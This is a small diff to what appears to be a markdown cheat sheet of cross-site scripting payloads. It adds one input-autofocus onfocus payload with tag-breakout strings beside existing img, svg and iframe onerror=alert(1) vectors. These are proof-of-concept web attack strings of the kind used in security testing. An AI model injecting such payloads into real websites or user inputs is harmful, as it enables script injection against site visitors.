@@ -39,6 +39,7 @@ TODO: Put encoded html symbol signs
 <img src="" onerror=alert(1)>
 <svg src="" onerror=alert(1)>
 <iframe src="" onerror=alert(1)>
+<input autofocus oNFocus="setTimeout(function() {alert(1)}, 5000);"></input><;/style<;/title<;/textarea<;/script>
 ```
 
 ## Attack Vector
